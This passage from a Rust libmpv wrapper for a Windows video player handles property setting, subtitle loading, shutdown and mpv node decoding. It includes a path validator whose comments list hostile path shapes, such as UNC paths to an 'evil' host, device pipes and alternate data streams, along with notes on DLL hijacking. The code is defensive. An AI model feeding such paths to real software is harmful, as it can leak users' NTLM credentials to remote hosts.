        self.set_double_property("volume", volume)
    }

    /// 设置一个 int64 属性（`scale` / `sub-delay` 等）。
    ///
    /// 注意：**不要**用它切轨。`sid` / `aid` 在 mpv 里是 choice 类型，
    /// 传 int64 有时成功有时报 `MPV_ERROR_PROPERTY_FORMAT`（实测
    /// `sid = 1` 返回 0、`sid = -1` 直接失败），行为不一致。
    /// 切轨走 [`MpvPlayer::select_track`]。
    pub fn set_int_property(&self, name: &str, value: i64) -> Result<(), String> {
        let cname = CString::new(name).map_err(|_| "属性名包含空字节".to_string())?;
        let mut v = value;
        let code = unsafe {
            (self.api.set_property)(
                self.handle,
                cname.as_ptr(),
                MPV_FORMAT_INT64,
                &mut v as *mut _ as *mut c_void,
            )
        };
        check(&self.api, code, &format!("setting property {name}"))
    }

    /// 选中某条轨道。`prop` 是 `"aid"`（音轨）或 `"sid"`（字幕轨）。
    ///
    /// 走**字符串**而不是 int64：`aid` / `sid` 在 mpv 里是 choice 属性，
    /// 官方给的写法就是字符串（`"1"`、`"auto"`、`"no"`）。实测传 int64 时
    /// `sid = 1` 能过、`sid = -1` 报 `MPV_ERROR_PROPERTY_FORMAT` ——
    /// 关字幕的 `-1` 正好是失败的那个，症状是「字幕关不掉」。
    pub fn select_track(&self, prop: &str, id: i64) -> Result<(), String> {
        self.set_string_property(prop, &id.to_string())
    }

    /// 关掉字幕（`sid = no`）。
    pub fn disable_subtitles(&self) -> Result<(), String> {
        self.set_string_property("sid", OFF_TRACK)
    }

    /// 设置一个字符串属性（`sid` / `aid` / `sub-encoding` …）。
    ///
    /// ## 必须走 `mpv_set_property_string`，不能走 `mpv_set_property` + STRING
    ///
    /// 同一份 libmpv（0.41）上实测：
    ///
    /// ```text
    /// mpv_set_property(h, "volume", MPV_FORMAT_STRING, "50")  -> 0xC0000005 访问违例
    /// mpv_set_property(h, "volume", MPV_FORMAT_DOUBLE, &50.0)  -> 返回 0，正常
    /// mpv_set_property_string(h, "volume", "50")              -> 返回 0，正常
    /// ```
    ///
    /// 崩的是 `MPV_FORMAT_STRING` 这**一种格式**，同一个函数换 DOUBLE 就好；
    /// 同一份二进制、同一台机器、连续 10 轮每次都崩在同一处（`set_property`
    /// 调用内部），而 `set_property_string` 10 轮全过且值确实写进去了。
    /// 偶尔（同一次二进制、另一种调用顺序）它会返回 `-9`
    /// （`MPV_ERROR_PROPERTY_FORMAT`）而不崩 —— 也就是说这条路径的行为
    /// **本身就不确定**，不能靠「有时候不崩」来用它。
    ///
    /// libmpv 内部为什么这样没有定位到（不是我们这侧的 ABI 不匹配：同一个
    /// 符号传 DOUBLE 正常、传 STRING 崩，而 `set_property_string` 是另一个
    /// 独立符号）。所以这里的做法是**绕开它**，不是修它：
    /// 字符串一律走 `mpv_set_property_string`，那个是 mpv 文档里给字符串
    /// 用的正规入口，10/10 稳定。
    ///
    /// 这条注释别删：改回 `set_property` + STRING 不会编译失败、不会 clippy
    /// 报警，只会在运行中崩 —— 而崩的是**整个进程**，界面上什么都看不到。
    pub fn set_string_property(&self, name: &str, value: &str) -> Result<(), String> {
        let cname = CString::new(name).map_err(|_| "属性名包含空字节".to_string())?;
        let cval = CString::new(value).map_err(|_| format!("属性值包含空字节：{value:?}"))?;
        let code =
            unsafe { (self.api.set_property_string)(self.handle, cname.as_ptr(), cval.as_ptr()) };
        check(&self.api, code, &format!("setting property {name}"))
    }

    /// 加载一个外挂字幕文件（`sub-add`），带自定义 flags。
    ///
    /// `flags` 只能填**一个**标志，填错时 mpv 返回 `invalid parameter`
    /// —— 命令发不出去，字幕也不会加，但用户那边什么提示都没有。
    /// 实测（mpv 0.41 + `probe.srt`）能接受的值：
    ///
    /// ```text
    /// ""               -> 成功，加进去但不选中
    /// "select"        -> 成功，加进去并选中
    /// "default"       -> 成功，加进去并标成默认轨
    /// "auto"          -> 成功
    /// "yes"           -> 失败 invalid parameter
    /// "no"            -> 失败 invalid parameter
    /// "select,default"-> 失败 invalid parameter（不是逗号分隔的列表）
    /// ```
    ///
    /// 所以「选中」是 `select` 这个**名词**，不是 `yes`。凭直觉写成 `yes`
    /// 的话 mpv 会安静地拒绝，而界面表现是「拖了字幕没反应」。
    pub fn add_subtitle_with_flags(&self, path: &Path, flags: &str) -> Result<(), String> {
        // 与 `load_file` 同一道校验，不省。
        //
        // `sub-add` 的第一个参数和 `loadfile` 一样是 **URL**，mpv 会拿当前
        // 用户的凭据去协商 SMB/NTLM。所以一个 `\\evil\share\x.srt` 走这条路
        // 和走 `loadfile` 的攻击链完全一样。`load_file` 里那段「校验点只有
        // 一个才不会漏」的论证在这里同样成立 —— 少一次校验就是漏。
        reject_remote_path(path)?;
        let Some(p) = path.to_str() else {
            return Err("subtitle path is not valid Unicode".to_string());
        };
        self.command(&["sub-add", p, flags])
    }

    /// 加载一个外挂字幕文件并**当场选中**。
    ///
    /// 用 `sub-add` 而不是 `loadfile`：`loadfile` 会**替换**当前媒体，
    /// 而拖一个 `.srt` 进来时用户想要的是「给这个视频加字幕」。
    ///
    /// `select` 让刚加进来的字幕立刻在放 —— 不然用户拖完什么也没发生，
    /// 得再去菜单里手动选一次，那看起来就像「拖字幕不管用」。
    pub fn add_subtitle(&self, path: &Path) -> Result<(), String> {
        self.add_subtitle_with_flags(path, "select")
    }

    pub fn set_mute(&self, muted: bool) -> Result<(), String> {
        self.set_flag_property("mute", muted)
    }

    /// 停止事件线程并销毁 mpv 上下文。可重复调用。
    ///
    /// 返回 `quit` 命令的结果而不是吞掉：`mpv_command_async` 遇到无效的
    /// 命令名只会返回错误码、什么都不做，吞掉的话「命令名写错了」和
    /// 「正常退出」看起来完全一样。`cycle-pause` 就是这样静默失效的。
    pub fn shutdown(&self) -> Result<(), String> {
        if self.shutdown.swap(true, Ordering::Relaxed) {
            return Ok(()); // 已经关过了
        }
        // 先让 mpv 停播，事件线程会收到 EVENT_SHUTDOWN 自行退出
        let result = self.command(&["quit"]);
        self.finish();
        result
    }

    /// join 事件线程、清掉未归还的命令参数、销毁上下文。
    ///
    /// `shutdown` 与 `Drop` 共用：命令是异步的，`pending` 里登记的参数靠
    /// `COMMAND_REPLY` 归还。`shutdown` 里先置了 shutdown 标志，事件线程可能
    /// 在回复到达之前就退出了，于是那批 `CString` 再没人 `remove`，得在这里
    /// 统一清掉。
    fn finish(&self) {
        self.join_event_thread();
        self.pending
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .clear();
        // swap 而不是 load+store：两个调用点（shutdown 与 Drop）并发时
        // 也只有一个能拿到 true
        if self.destroyed.swap(true, Ordering::AcqRel) {
            return;
        }
        if !self.handle.is_null() {
            unsafe { (self.api.destroy)(self.handle) };
        }
    }

    fn join_event_thread(&self) {
        if let Some(thread) = self
            .event_thread
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .take()
        {
            let _ = thread.join();
        }
    }
}

impl Drop for MpvPlayer {
    fn drop(&mut self) {
        // 正常路径是显式 shutdown()；这里兜底，保证线程一定被 join、
        // 上下文一定被销毁，否则 MpvApi（以及它持有的 DLL）会在事件线程
        // 仍在运行时被卸载，mpv 内部的一切资源也都泄漏。
        // 句柄为空说明 shutdown() 已经销毁过了，`finish` 内部会跳过。
        self.shutdown.store(true, Ordering::Relaxed);
        self.finish();
    }
}

// ---------------------------------------------------------------- 路径准入

/// 只放行「本地盘上的文件」这一种形状，其余一律拒绝。
///
/// 判据是**盘符开头**（`X:\...`），而不是「长得像不像本地路径」。这样能一起挡掉：
///
/// | 形状 | 例子 | 为什么必须挡 |
/// |---|---|---|
/// | UNC 路径 | `\\evil\share\a.mp4` | `is_file()` 会真的去建 SMB 连接，用当前用户凭据协商 NTLM |
/// | 扩展 UNC | `\\?\UNC\evil\share\a.mp4` | 同上，绕过 `\\` 前缀判断 |
/// | 设备路径 | `\\.\PIPE\...`、`\\?\PhysicalDrive0` | 命名管道与裸设备访问 |
/// | `//` 正斜杠 UNC | `//evil/share/a.mp4` | Windows 同样当 UNC 处理 |
/// | 盘符缺失的相对路径 | `a.mp4`、`\a.mp4` | 依赖当前工作目录，程序从资源管理器启动时 CWD 不确定 |
/// | ADS | `C:\a.mp4:stream` | 绕过扩展名判断读到隐藏数据流 |
///
/// 返回值是给用户看的，所以只说「只接受本地文件路径」而不复述路径内容——
/// 路径本身可能很长，回显到 MessageBox 里既难看也可能被日志截断。
fn reject_remote_path(path: &Path) -> Result<(), String> {
    const REJECT: &str = "only local drive paths are accepted (for example D:\\video.mp4)";
    let units: Vec<u16> = path.as_os_str().encode_wide().collect();

    // 太长的形状先排掉，避免后面一堆索引判断被超长输入牵着走
    if units.len() < 3 {
        return Err(REJECT.to_string());
    }
    let is_drive_letter = |u: u16| (u as u8 as char).is_ascii_alphabetic();
    // 第一段必须是 ASCII 盘符 + ':' + '\'
    if !is_drive_letter(units[0]) || units[1] != b':' as u16 {
        return Err(REJECT.to_string());
    }
    // 盘符后必须紧跟反斜杠：`C:foo.mp4` 是「当前目录下的 foo.mp4」，
    // 依赖 CWD，不是我们要的形状
    if units[2] != b'\\' as u16 {
        return Err(REJECT.to_string());
    }
    // 这里**不再**扫描路径中段有没有 `\\` / `//`。
    //
    // 真正的 UNC、扩展 UNC（`\\?\UNC\`）、设备路径（`\\.\PIPE\`）全部以
    // `\\` 或 `//` **开头**，已经被上面「必须是 `X:\` 开头」这一条挡掉了。
    // 而 `D:\a\\b` 中间那个重复分隔符是 Windows 合法路径（等价于 `D:\a\b`），
    // 拖放和用户输入都可能产生，拒它属于误伤。
    Ok(())
}

// ---------------------------------------------------------------- 事件解码

/// 一棵从 mpv 复制出来的值树。
///
/// 之所以整个复制而不是借用：mpv 分配的那棵树必须立刻归还（它归
/// `mpv_free_node_contents` 管），而界面要拿这些数据填好几层 UI、
/// 还要在换文件时继续读上一份 —— 借用只能活一个瞬间。
///
/// 列表用 `Vec<(Option<String>, MpvValue)>` 而不是 map：mpv 的节点数组
/// 既可以是「有序列表」（`keys == NULL`，比如 `chapters`）也可以是
/// 「对象」（有 keys）。用 map 会把有序的那一半也排成哈希序，而字幕轨、
/// 音轨的**顺序是有意义的**（默认轨就是数组里的第一个）。
#[derive(Debug, Clone, PartialEq)]
pub enum MpvValue {
    Flag(bool),
    Int(i64),
    Double(f64),
    Text(String),
    List(Vec<(Option<String>, MpvValue)>),
}

impl MpvValue {
    /// 按键取值。`keys == NULL` 的列表返回 `None`。
    pub fn get(&self, key: &str) -> Option<&MpvValue> {
        match self {
            MpvValue::List(items) => items
                .iter()
                .find(|(k, _)| k.as_deref() == Some(key))
                .map(|(_, v)| v),
            _ => None,
        }
    }

    /// 取出子节点并按字符串解析，类型不符返回 `None`。
    pub fn get_str(&self, key: &str) -> Option<&str> {
        match self.get(key) {
            Some(MpvValue::Text(s)) => Some(s),
            _ => None,
        }
    }

    /// 取出子节点并按整数解析。
    pub fn get_int(&self, key: &str) -> Option<i64> {
        match self.get(key) {
            Some(MpvValue::Int(v)) => Some(*v),
            // mpv 有时把整数报成 double（比如从 Lua 侧塞进去的），
            // 宽松一点比「界面少一项」好
            Some(MpvValue::Double(v)) => Some(*v as i64),
            _ => None,
        }
    }

    /// 取出子节点并按布尔解析。
    pub fn get_flag(&self, key: &str) -> Option<bool> {
        match self.get(key) {
            Some(MpvValue::Flag(v)) => Some(*v),
            _ => None,
        }
    }

    /// 子节点列表。
    pub fn list(&self) -> Option<&[(Option<String>, MpvValue)]> {
        match self {
            MpvValue::List(items) => Some(items),
            _ => None,
        }
    }

    /// 自己是不是字符串（用来区分「轨道的 title 可能是数字」这类情况）。
    pub fn as_str(&self) -> Option<&str> {
        match self {
            MpvValue::Text(s) => Some(s),
            _ => None,
        }
    }
}

/// 保证 `mpv_free_node_contents` 被调用一次。
///
/// 不这么做的后果不是立刻崩溃而是**慢慢泄漏**：mpv 侧每个字符串、每个
/// 数组都是单独分配的，`track-list` 一个文件就有几十个节点。
struct NodeGuard {
    node: ffi::MpvNode,
    free: ffi::FnFreeNodeContents,
}

impl Drop for NodeGuard {
    fn drop(&mut self) {
        // SAFETY: `node` 由 `mpv_get_property` 填充、格式合法，
        // `free` 是从 DLL 里取出的 `mpv_free_node_contents`。
        // 只在 `get_node_tree` 里构造，构造点就在 `assume_init` 之后。
        unsafe { (self.free)(&mut self.node) }
    }
}

/// 递归复制一棵节点树。
///
/// 深度是**递归**的，而节点树来自 mpv 内部（不是用户输入），深度由 mpv
//  决定、实测 `track-list` 是 3 层。这里不设人为上限：真出现环或超深结构时
//  栈会溢出，而那属于「mpv 出了我们控制范围的问题」，加个深度计数只是把
//  崩溃变成静默丢数据，反而更难查。
fn convert_node(node: &ffi::MpvNode) -> MpvValue {
    match node.format {
        MPV_FORMAT_STRING => {
            let p = unsafe { node.u.string };
            if p.is_null() {
                MpvValue::Text(String::new())
            } else {
                // SAFETY: format 是 STRING 时 `u.string` 是有效的 NUL 结尾
                // UTF-8（mpv 保证），这里复制成 Rust 的 String 后不再借用它
                MpvValue::Text(unsafe { CStr::from_ptr(p) }.to_string_lossy().into_owned())
            }
        }
        MPV_FORMAT_FLAG => MpvValue::Flag(unsafe { node.u.flag != 0 }),
        MPV_FORMAT_INT64 => MpvValue::Int(unsafe { node.u.int64 }),
        MPV_FORMAT_DOUBLE => MpvValue::Double(unsafe { node.u.double_ }),
        // 6 / 7 / 8 都是「类列表」：结构完全一样，区别只在语义
        // （node / 数组 / 对象）。漏掉任何一个都会把整棵树静默变成空列表
        // —— 见 `ffi.rs` 里那段实测记录。
        MPV_FORMAT_NODE | MPV_FORMAT_NODE_ARRAY | MPV_FORMAT_NODE_MAP => {
            let list = unsafe { node.u.list };
            if list.is_null() {
                return MpvValue::List(Vec::new());
            }
            // SAFETY: format 是 NODE 时 `u.list` 指向 mpv 分配、已由
            // NodeGuard 保证在本函数返回后仍然有效的一份节点数组
            let list = unsafe { &*list };
            // `values` 也要查 null，不能只查 `keys`。
            //
            // mpv 的契约保证 `num > 0` 时 `values` 非空，所以这不是可利用的
            // bug；但这一段里连 `CStr::from_ptr` 的可空性都考虑了，唯独
            // `values.add(0)` 在 null 上是 UB，风格上不一致 —— 补上之后
            // 「读到的形状不对」一律退化成空列表，而不是野指针。
            if list.values.is_null() {
                return MpvValue::List(Vec::new());
            }
            let has_keys = !list.keys.is_null();
            let mut out = Vec::with_capacity(list.num.max(0) as usize);
            for i in 0..list.num.max(0) as usize {
                // `values` 与 `keys` 等长。keys 为 NULL 时 mpv 保证
                // values 也非 NULL（空数组）。
                let value = unsafe { convert_node(&*list.values.add(i)) };
                let key = if has_keys {
                    let k = unsafe { *list.keys.add(i) };
                    Some(if k.is_null() {
                        String::new()
                    } else {
                        // SAFETY: 同上，keys 是 NUL 结尾的 C 字符串
                        unsafe { CStr::from_ptr(k) }.to_string_lossy().into_owned()
                    })
                } else {
                    None
                };
                out.push((key, value));
            }
            MpvValue::List(out)
        }
        // BYTE_ARRAY / 未知 format：不是我们要的形状，当空列表而不是 panic。
        // 见到它说明 mpv 加了新格式，那时候该显式处理。
        _ => MpvValue::List(Vec::new()),
    }
}

fn check(api: &MpvApi, code: c_int, what: &str) -> Result<(), String> {
    if code < 0 {
        Err(format!("{what} failed: {}", api.error_message(code)))
    } else {
        Ok(())
    }
}

/// 属性事件里 `prop.data` 的含义由观察时传的格式决定，
/// 这里按属性名反查格式，把裸指针还原成带类型的值。
fn decode_property(
    data: *mut c_void,
    format_of: impl Fn(&str) -> Option<c_int>,
) -> Option<MpvEventMessage> {
    if data.is_null() {
        return None;
    }
    let prop = unsafe { &*(data as *const MpvEventProperty) };
    let name = lookup_property(prop.name)?;
    let format = format_of(name)?;

    let value = if prop.data.is_null() {
        // 文件被卸载时 mpv 会把已知类型的属性置为 null。
        // 这不是「值变成 0」，交给上层保持上一份状态。
        return None;
    } else {
        match format {
            MPV_FORMAT_FLAG => PropertyValue::Flag(unsafe { *(prop.data as *const c_int) != 0 }),
            MPV_FORMAT_DOUBLE => PropertyValue::Number(unsafe { *(prop.data as *const f64) }),
            // `int64` 是 i64 而不是 c_int：丢帧计数用 int 存会在 2^31 帧之后
            // 溢出（按 60fps 算是 414 天连续播放，理论上可能但不该靠它不出错）
            MPV_FORMAT_INT64 => PropertyValue::Integer(unsafe { *(prop.data as *const i64) }),
            MPV_FORMAT_STRING => {
                let ptr = unsafe { *(prop.data as *const *const c_char) };
                if ptr.is_null() {
                    // 注意：这里读的是 mpv 内部持有的字符串指针，
                    // 不是 mpv 为调用方分配的副本，因此绝不能 mpv_free。
                    // （只有 mpv_get_property 返回的字符串才需要释放。）
                    PropertyValue::Text(String::new())
                } else {
                    let text = unsafe { CStr::from_ptr(ptr).to_string_lossy().into_owned() };
                    PropertyValue::Text(text)
                }
            }
            _ => return None,
        }
    };

    Some(MpvEventMessage::Property(PropertyChange { name, value }))
}

fn decode_end_file(
    api: &MpvApi,
    data: *mut c_void,
    fallback_error: c_int,
) -> Option<MpvEventMessage> {
    let (reason, error) = if data.is_null() {
        (0, fallback_error)
    } else {
        let end = unsafe { &*(data as *const MpvEventEndFile) };
        (end.reason, end.error)
    };

    if reason == MPV_END_FILE_REASON_ERROR {
        Some(MpvEventMessage::Error(format!(
            "playback failed: {}",
            api.error_message(error)
        )))
    } else {
        Some(MpvEventMessage::EndFile)
    }
}

/// 把 mpv 返回的属性名映射回静态字符串，便于上层按固定字段名匹配。
fn lookup_property(ptr: *const c_char) -> Option<&'static str> {
    if ptr.is_null() {
        return None;
    }
    let name = unsafe { CStr::from_ptr(ptr) }.to_str().ok()?;
    OBSERVED_PROPERTIES
        .iter()
        .find(|(n, _)| *n == name)
        .map(|(n, _)| *n)
}

// ---------------------------------------------------------------- DLL 定位

const DLL_NAME: &str = "libmpv-2.dll";

/// 找到 `libmpv-2.dll`。
///
/// 优先级：
/// 1. 环境变量 `MPV2_DLL`（**仅 debug 构建**，排查打包问题时手动指定）
/// 2. 可执行文件所在目录
/// 3. debug 构建额外向上找几级、并回退到源码目录
///
/// 向上找和环境变量都只对 debug 开放：cargo 会把测试/示例的可执行文件放进
/// `target/<profile>/deps/`，而 `build.rs` 把 DLL 放在 `target/<profile>/`。
/// 正式版本如果也向上找、或认环境变量，就等于允许 `C:\Program Files\`、
/// 用户目录或任何环境变量指定位置里的同名 DLL 被优先加载（DLL 劫持），
/// 所以 release 只认 exe 同级。
fn resolve_library_path() -> Result<PathBuf, String> {
    // MPV2_DLL 只在 debug 构建里认。它是「从任意路径加载一个 DLL」的能力：
    // 放在 release 里，就等于允许任何能设置环境变量的人（网页链接、别的程序、
    // 快捷方式）让正式版去加载任意位置的 libmpv-2.dll，比同目录查找危险得多。
    // 打包后的正式版没有排查 DLL 问题的需求——它旁边就躺着那个 DLL。
    if cfg!(debug_assertions) {
        if let Ok(custom) = std::env::var("MPV2_DLL") {
            let p = PathBuf::from(custom);
            if p.is_file() {
                return Ok(p);
            }
        }
    }

    let mut candidates = Vec::new();

    if let Some(mut dir) = std::env::current_exe()
        .ok()
        .and_then(|e| e.parent().map(Path::to_path_buf))
    {
        // 只认 exe 同级：安装程序与免安装包都把 DLL 放在 exe 同级
        candidates.push(dir.join(DLL_NAME));
        if cfg!(debug_assertions) {
            for _ in 0..2 {
                match dir.parent() {
                    Some(parent) => dir = parent.to_path_buf(),
                    None => break,
                }
                candidates.push(dir.join(DLL_NAME));
            }
        }
    }

    candidates.extend(extra_candidates());

    if let Some(found) = candidates.iter().find(|p| p.exists()) {
        return Ok(found.clone());
    }

    Err(format!(
        "未找到 {DLL_NAME}。已尝试:\n  {}\n可用环境变量 MPV2_DLL 指定完整路径。",
        candidates
            .iter()
            .map(|p| p.display().to_string())
            .collect::<Vec<_>>()
            .join("\n  ")
    ))
}

/// 只在 debug 构建里生效的额外候选路径。
///
/// 用 `#[cfg]` 而不是 `cfg!`，这样正式二进制里不会残留源码目录字符串。
#[cfg(debug_assertions)]
fn extra_candidates() -> Vec<PathBuf> {
    vec![
        Path::new(env!("CARGO_MANIFEST_DIR")).join(DLL_NAME),
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .map(|p| p.join("vendor").join(DLL_NAME))
            .unwrap_or_default(),
    ]
}

#[cfg(not(debug_assertions))]
fn extra_candidates() -> Vec<PathBuf> {
    Vec::new()
}
